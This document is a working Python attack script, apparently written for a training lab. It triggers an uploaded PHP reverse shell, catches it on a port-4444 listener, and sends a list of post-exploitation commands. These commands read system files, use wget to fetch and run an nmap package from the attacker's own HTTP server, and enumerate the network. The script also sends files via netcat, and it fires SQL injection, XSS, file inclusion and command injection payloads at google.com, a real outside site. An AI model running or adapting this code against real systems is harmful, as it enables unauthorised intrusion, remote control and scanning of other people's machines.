import requests
import socket
import threading
import time

import random
import string
import urllib.parse

def handle_connection(client_socket, commands_to_execute):
    """
    Handle reverse shell connection and execute commands automatically.
    Returns a dictionary with command outputs.
    """
    print("Reverse shell connected! Executing commands...")
    results = {}
    
    try:
        # Set socket timeout (longer for nmap scans)
        client_socket.settimeout(30)
        
        # Read initial connection message
        initial = client_socket.recv(4096).decode('utf-8', errors='ignore')
        print(f"[INITIAL] {initial}")
        
        # Execute each command and wait for completion
        for idx, command in enumerate(commands_to_execute, 1):
            print(f"[CMD {idx}/{len(commands_to_execute)}] Executing: {command}")
            
            # Send command with end marker
            client_socket.send((command + "; echo '<<<CMD_DONE>>>'\n").encode('utf-8'))
            
            # Determine timeout based on command type
            if 'nmap' in command or './scan.sh' in command:
                initial_wait = 5  # Extra time for nmap to start
                read_timeout = 60  # Longer timeout for nmap scans
            elif 'tar' in command or 'wget' in command:
                initial_wait = 3
                read_timeout = 30
            else:
                initial_wait = 1
                read_timeout = 10
            
            time.sleep(initial_wait)
            
            # Receive response until we see the completion marker
            output = ""
            client_socket.settimeout(read_timeout)
            
            try:
                while True:
                    chunk = client_socket.recv(4096).decode('utf-8', errors='ignore')
                    if not chunk:
                        break
                    output += chunk
                    
                    # Check if we've received the completion marker
                    if '<<<CMD_DONE>>>' in output:
                        # Remove the marker from output
                        output = output.replace('<<<CMD_DONE>>>', '').strip()
                        break
                    
                    # If buffer is full, keep reading
                    if len(chunk) == 4096:
                        continue
                    
                    # Small wait to see if more data is coming
                    time.sleep(0.5)
                    try:
                        client_socket.settimeout(2.0)
                        more = client_socket.recv(4096).decode('utf-8', errors='ignore')
                        if more:
                            output += more
                            if '<<<CMD_DONE>>>' in more:
                                output = output.replace('<<<CMD_DONE>>>', '').strip()
                                break
                        else:
                            break
                    except socket.timeout:
                        break
                        
            except socket.timeout:
                print(f"[WARN] Command timed out after {read_timeout}s")
            
            results[command] = output.strip()
            print(f"[RESULT] Command completed. Output length: {len(output)} chars")
            if output:
                print(f"[OUTPUT] {output[:300]}...")  # Print first 300 chars
        
        # Send exit command
        client_socket.send(b"exit\n")
        
    except Exception as e:
        print(f"[ERROR] Connection error: {e}")
    finally:
        client_socket.close()
    
    return results

def execute_command(command):
    import subprocess
    result = subprocess.getoutput(command)
    return result

def start_server(commands_to_execute, results_dict, event):
    """
    Start listener and wait for reverse shell connection.
    Execute commands and store results.
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', 4444))
    server_socket.listen(1)
    server_socket.settimeout(60)  # 60 second timeout for connection
    
    print("[+] Server listening on port 4444...")
    
    try:
        client_socket, addr = server_socket.accept()
        print(f"[+] Connection from {addr}")
        
        # Execute commands and get results
        results = handle_connection(client_socket, commands_to_execute)
        results_dict.update(results)
        
    except socket.timeout:
        print("[-] Timeout waiting for reverse shell connection")
    except Exception as e:
        print(f"[-] Server error: {e}")
    finally:
        server_socket.close()
        event.set()  # Signal that we're done

# === CONFIG ===
TARGET_BASE = "http://google.com"
WORDLIST = ['admin', 'login', 'config', 'backup', 'test', 'dev', 'phpinfo', 'index', 'home', 'upload', 'file', 'shell', 'web', 'app', 'api', 'status', 'health', 'info']
SQLI_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "1' UNION SELECT 1,2,3--", "' OR SLEEP(5)--"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"'><script>alert(1)</script>"]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../windows/win.ini", "/proc/version"]
CMD_INJ_PAYLOADS = [";id", "|whoami", "&&cat /etc/passwd", ";ls"]

# === Simulate Directory Scan + Follow-up Attacks ===
def simulate_pentest_traffic():
    print("\n[+] Starting pentest traffic simulation...")
    session = requests.Session()
    
    # 1. Directory Brute-Force
    for word in WORDLIST:
        url = f"{TARGET_BASE}/{word}.php"
        try:
            r = session.get(url, timeout=3)
            print(f"[DIR] {url} -> {r.status_code}")
            
            # If 200 OK → EXPLOIT FURTHER
            if r.status_code == 200:
                print(f"    [+] HIT! Triggering follow-up attacks on {url}")
                
                # Extra GET requests (simulate crawling)
                for _ in range(3):
                    session.get(url, timeout=2)
                
                # SQLi on ?id= or ?page=
                for payload in SQLI_PAYLOADS:
                    sqli_url = f"{url}?id={urllib.parse.quote(payload)}"
                    session.get(sqli_url, timeout=2)
                
                # XSS
                for payload in XSS_PAYLOADS:
                    xss_url = f"{url}?q={urllib.parse.quote(payload)}"
                    session.get(xss_url, timeout=2)
                
                # LFI
                for payload in LFI_PAYLOADS:
                    lfi_url = f"{url}?file={urllib.parse.quote(payload)}"
                    session.get(lfi_url, timeout=2)
                
                # Command Injection
                for payload in CMD_INJ_PAYLOADS:
                    cmd_url = f"{url}?cmd={urllib.parse.quote(payload)}"
                    session.get(cmd_url, timeout=2)
                    
        except:
            pass  # Silent fail for stealth
        
        time.sleep(random.uniform(0.1, 0.7))  # Random delay

    # 2. Simulate random probing on index
    index_url = f"{TARGET_BASE}/index.php"
    for _ in range(10):
        param = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
        session.get(f"{index_url}?{param}=1", timeout=2)
        time.sleep(0.2)

    print("[+] Pentest simulation complete.\n")

def send_file_via_netcat(target_ip, target_port, filepath):
    """Send file to target using netcat"""
    import subprocess
    print(f"[*] Sending {filepath} to {target_ip}:{target_port} via netcat...")
    try:
        # Wait a bit for target listener to be ready
        time.sleep(5)
        cmd = f"nc {target_ip} {target_port} < {filepath}"
        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
        if result.returncode == 0:
            print(f"[+] File sent successfully!")
        else:
            print(f"[-] File transfer failed: {result.stderr.decode()}")
        return result.returncode == 0
    except Exception as e:
        print(f"[-] Error sending file: {e}")
        return False

def execute_reverse_shell_attack(target_url, commands, send_file_callback=None):
    """
    Main function to execute reverse shell attack:
    1. Start listener
    2. Trigger reverse shell
    3. Execute commands
    4. Return results
    """
    print("\n" + "="*60)
    print("[+] REVERSE SHELL ATTACK SEQUENCE")
    print("="*60)
    
    # Prepare shared data structures
    results_dict = {}
    completion_event = threading.Event()
    
    # Start the listener in a thread
    print("[1] Starting listener on port 4444...")
    server_thread = threading.Thread(
        target=start_server,
        args=(commands, results_dict, completion_event)
    )
    server_thread.daemon = True
    server_thread.start()
    
    # Wait for listener to be ready
    time.sleep(2)
    
    # Trigger the reverse shell
    print(f"[2] Triggering reverse shell at {target_url}...")
    try:
        # Use a very short timeout since reverse shell won't return response
        response = requests.get(target_url, timeout=3)
        print(f"    Response code: {response.status_code}")
        print(f"    Response data: {response.text}")
    except requests.exceptions.Timeout:
        print("    [!] Request timeout (expected - shell connected in background)")
    except requests.exceptions.RequestException as e:
        print(f"    [!] Request error: {e}")
        exit()
    
    # If there's a file transfer callback, execute it
    if send_file_callback:
        print("[3] Initiating file transfer...")
        file_thread = threading.Thread(target=send_file_callback)
        file_thread.daemon = True
        file_thread.start()
    
    # Wait for command execution to complete
    print("[4] Waiting for command execution...")
    completion_event.wait(timeout=300)  # Wait up to 5 minutes for nmap scans
    
    print("[5] Command execution complete!")
    print("="*60)
    
    return results_dict


def start_http_server(port=8000):
    """Start a simple HTTP server in the current directory"""
    import http.server
    import socketserver
    import os
    
    os.chdir('/home/student/Desktop')
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), Handler)
    print(f"[*] HTTP Server started on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    # Configuration
    TARGET_URL = "http://www.secureskies.com/uploads/reverse4.php"
    ATTACKER_IP = "12.0.0.45"  # This machine's IP for HTTP server
    HTTP_PORT = 8000
    
    # === BASIC ENUMERATION COMMANDS (commented out) ===
    # COMMANDS = [
    #     "whoami",
    #     "id",
    #     "pwd",
    #     "uname -a",
    #     "ls -la /tmp",
    #     "cat /etc/passwd | head -10",
    #     "ps aux | head -10"
    # ]
    
    # Start HTTP server in background thread
    print(f"[*] Starting HTTP server on port {HTTP_PORT}...")
    http_thread = threading.Thread(target=start_http_server, args=(HTTP_PORT,))
    http_thread.daemon = True
    http_thread.start()
    time.sleep(3)  # Give server time to start
    
    # Verify HTTP server is running
    print(f"[*] Verifying HTTP server is accessible at http://{ATTACKER_IP}:{HTTP_PORT}/")
    try:
        test_response = requests.get(f"http://{ATTACKER_IP}:{HTTP_PORT}/", timeout=5)
        print(f"[+] HTTP server is running (status: {test_response.status_code})")
    except Exception as e:
        print(f"[!] Warning: Could not verify HTTP server - {e}")
        print(f"[!] Make sure the server is accessible from the target at http://{ATTACKER_IP}:{HTTP_PORT}/")
        time.sleep(2)
    
    # === NETWORK ENUMERATION WITH NMAP ===
    COMMANDS = [
        # Step 1: Get basic system info
        "whoami",
        "hostname",
        "uname -a",
        
        # Step 2: Get network configuration
        "ip addr show",
        "ip route show",
        "cat /etc/resolv.conf",
        
        # Step 3: Check if nmap is installed
        #"which nmap",
        
        # Step 4: Check if we have writable temp directory
        "mkdir -p /tmp/nmap_transfer && cd /tmp/nmap_transfer && pwd",
        
        # Step 5: Remove old nmap archive if exists
        "rm -f /tmp/nmap_transfer/nmap.tar.gz /tmp/nmap_transfer/nmap-x64 -rf",
        
        # Step 5b: Test connectivity to attacker's HTTP server
        f"curl -I http://{ATTACKER_IP}:{HTTP_PORT}/ 2>&1 || wget --spider http://{ATTACKER_IP}:{HTTP_PORT}/ 2>&1",
        
        # Step 6: Download nmap archive from attacker machine using wget
        f"cd /tmp/nmap_transfer && wget -T 60 -t 5 --no-check-certificate -c http://{ATTACKER_IP}:{HTTP_PORT}/nmap-x64.tar.gz -O nmap.tar.gz 2>&1",
        
        # Step 7: Wait for file system sync
        "sync && sleep 1",
        
        # Step 8: Verify download
        "ls -lh /tmp/nmap_transfer/nmap.tar.gz",
        
        # Step 9: Verify download - check size and file type
        "file /tmp/nmap_transfer/nmap.tar.gz",
        "du -h /tmp/nmap_transfer/nmap.tar.gz",
        
        # Step 10: Test gzip integrity before extraction
        "gzip -t /tmp/nmap_transfer/nmap.tar.gz 2>&1 && echo 'gzip file is valid' || echo 'ERROR: gzip file is corrupted'",
        
        # Step 11: Extract the tar.gz archive to nmap-x64 directory
        "cd /tmp/nmap_transfer && mkdir -p nmap-x64 && tar -xzvf nmap.tar.gz -C nmap-x64 2>&1",
        
        # Step 12: Verify extraction - check what was extracted
        "ls -la /tmp/nmap_transfer/",
        
        # Step 13: Check if nmap-x64 directory exists after extraction
        "test -d /tmp/nmap_transfer/nmap-x64 && echo 'SUCCESS: nmap-x64 directory exists' || echo 'ERROR: nmap-x64 directory NOT found'",
        
        # Step 14: Only proceed if directory exists - list contents
        "if [ -d /tmp/nmap_transfer/nmap-x64 ]; then ls -la /tmp/nmap_transfer/nmap-x64/; else echo 'Cannot list - directory does not exist'; fi",
        
        # Step 15: Make nmap executable (only if files exist)
        "if [ -f /tmp/nmap_transfer/nmap-x64/scan.sh ]; then chmod +x /tmp/nmap_transfer/nmap-x64/scan.sh && echo 'scan.sh made executable'; else echo 'scan.sh not found'; fi",
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then chmod +x /tmp/nmap_transfer/nmap-x64/nmap && echo 'nmap made executable'; else echo 'nmap not found'; fi",
        
        # Step 16: Verify permissions
        "if [ -f /tmp/nmap_transfer/nmap-x64/scan.sh ]; then ls -l /tmp/nmap_transfer/nmap-x64/scan.sh; fi",
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then ls -l /tmp/nmap_transfer/nmap-x64/nmap; fi",
    ]
    
    # Step 17: Run nmap scans (reduced to essential scans only)
    COMMANDS.extend([
        # Step 17a: Run scan.sh on localhost
        "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/scan.sh ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./scan.sh 127.0.0.1 2>&1; else echo 'ERROR: Cannot run scan.sh - files not found'; fi",
        
        # Step 17b: Run simple nmap scan on localhost
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sT -p 1-1000 127.0.0.1 2>&1; else echo 'ERROR: nmap binary not found'; fi",
        
        # Step 18: Show network configuration for reference
        "ip -4 addr show | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}/\\d+'",
        
        # === COMMENTED OUT: Additional network scans ===
        # Step 19: Scan the internal network (ping sweep)
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sn 10.9.8.0/24 2>&1; else echo 'ERROR: nmap binary not found'; fi",
        
        # Step 20: Port scan on discovered network (common ports)
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sT -p 22,80,443,3306,8080 --open 10.9.8.0/24 2>&1; else echo 'ERROR: nmap binary not found'; fi",
        
        # Step 21: More detailed scan on web server range
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sV -p 80,443,8080 10.9.8.170-180 2>&1; else echo 'ERROR: nmap binary not found'; fi",
        
        # Step 22: Check for other potential targets
        # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sT -p 22,21,23,3389 --open 10.9.8.0/24 2>&1; else echo 'ERROR: nmap binary not found'; fi",
        
        # Step 19: Network neighbors and ARP cache
        "ip neigh show",
        
        # Step 20: Active connections
        "netstat -antup 2>&1 || ss -antup",
        
        # Step 21: Listening services
        "netstat -lntp 2>&1 || ss -lntp",
        
        # Step 22: Cleanup (optional)
        # "rm -rf /tmp/nmap_transfer",
    ])
    
    # === Step 1: Run pentest traffic simulation ===
    print("\n" + "="*60)
    print("[PHASE 1] PENTEST TRAFFIC SIMULATION")
    print("="*60)
    simulate_pentest_traffic()
    
    print("\n[*] Waiting 5 seconds before starting reverse shell attack...")
    time.sleep(5)
    
    # === Step 2: Execute reverse shell attack ===
    print("\n" + "="*60)
    print("[PHASE 2] REVERSE SHELL ATTACK & ENUMERATION")
    print("="*60)
    results = execute_reverse_shell_attack(TARGET_URL, COMMANDS)
    
    # Display results
    print("\n" + "="*60)
    print("COMMAND EXECUTION RESULTS")
    print("="*60)
    for cmd, output in results.items():
        print(f"\n[CMD] {cmd}")
        print("-" * 60)
        print(output if output else "[No output]")
        print()
    
    print("="*60)
    print("[+] Attack sequence completed")
    print("="*60)

    # ===================================================================
# === PENTEST TRAFFIC SIMULATION MODULE (ADDED SEPARATELY) ===========
# ===================================================================





